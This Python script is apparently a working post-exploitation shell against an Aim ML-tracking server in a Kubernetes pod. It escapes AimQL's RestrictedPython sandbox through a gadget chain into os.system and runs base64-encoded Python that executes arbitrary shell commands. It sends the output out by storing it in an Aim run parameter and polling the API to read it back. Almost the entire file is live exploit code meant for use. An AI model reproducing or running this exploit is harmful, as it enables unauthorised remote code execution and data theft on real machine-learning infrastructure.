#!/usr/bin/env python3
"""
Brainwash post-exploitation shell over the AimQL RCE.

Foothold recap:
  - aim tracking server is exposed on NodePort :30800 (unauth) -> self-seed a Run
  - with >=1 Run, the AimQL RestrictedPython escape on GET /api/runs/search/run?q=
    runs arbitrary python in the pod (uid 10001 'aim', ns brainwash-mlops, k3s)
  - root FS is read-only, so we exfil by stuffing command output into an aim Run
    param (repo=/data/repo) and reading it back over :80.

Usage:
  uv run python brainwash/rce_exec.py <host> '<shell command>'
  uv run python brainwash/rce_exec.py <host> --seed  # (re)create a run if num_runs==0
"""

import base64
import json
import random
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = sys.argv[1]
BASE = f"http://{HOST}"
GADGET = 'run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"]'


def http(path, params=None, method="GET", timeout=40):
    url = BASE + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    req = urllib.request.Request(url, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()


def num_runs():
    _, b = http("/api/projects/activity")
    try:
        return json.loads(b).get("num_runs", -1)
    except Exception:
        return -1


def fire(pycode):
    """Run python in the pod via the AimQL gadget (blind)."""
    b64 = base64.b64encode(pycode.encode()).decode()
    shell = f"echo {b64}|base64 -d|python3"
    lit = shell.replace("\\", "\\\\").replace('"', '\\"')
    # end with `or 1` so the predicate is truthy AFTER the command runs: with
    # limit=1 the search returns on the very first run, so cost is O(1) not O(runs).
    q = f'{GADGET}.system("{lit}") or 1'
    return http("/api/runs/search/run", {"q": q, "limit": "1", "report_progress": "false"})


def run_cmd(cmd, exp=None, wait=3.0):
    """Execute a shell command in the pod, exfil stdout+stderr via an aim run param."""
    exp = exp or "x" + "".join(random.choices(string.ascii_lowercase, k=10))
    py = (
        "import os,subprocess,traceback\n"
        f"gate='/tmp/rce-once-{exp}'\n"
        "if not os.path.exists(gate):\n"
        " open(gate,'w').write('1')\n"
        f" cmd={cmd!r}\n"
        " try:\n"
        "  o=subprocess.run(['bash','-lc',cmd],capture_output=True,timeout=110)\n"
        "  out=(o.stdout+o.stderr).decode('utf-8','replace')\n"
        " except Exception:\n"
        "  out=traceback.format_exc()\n"
        " try:\n"
        "  from aim import Run\n"
        f"  r=Run(repo='/data/repo',experiment={exp!r})\n"
        "  r['out']=out\n"
        "  r.close()\n"
        " except Exception:\n"
        "  open('/tmp/rce_err','w').write(traceback.format_exc())\n"
    )
    fire(py)
    time.sleep(wait)
    # poll for the experiment -> run -> 'out' param (payload creates it only after cmd finishes)
    for _ in range(50):
        try:
            eid = next(e["id"] for e in json.loads(http("/api/experiments")[1]) if e["name"] == exp)
            runs = json.loads(http(f"/api/experiments/{eid}/runs")[1]).get("runs", [])
            if runs:
                info = json.loads(http(f"/api/runs/{runs[0]['run_id']}/info")[1])
                if "out" in info.get("params", {}):
                    return info["params"]["out"]
        except Exception:
            pass
        time.sleep(2.5)
    return "<not found — RCE may have failed or timed out>"


if __name__ == "__main__":
    arg = sys.argv[2] if len(sys.argv) > 2 else "id; hostname"
    if arg == "--seed":
        print("num_runs =", num_runs())
        sys.exit(0)
    if num_runs() < 1:
        print("[!] num_runs==0 — seed first via the :30800 tracking server", file=sys.stderr)
    print(run_cmd(arg))
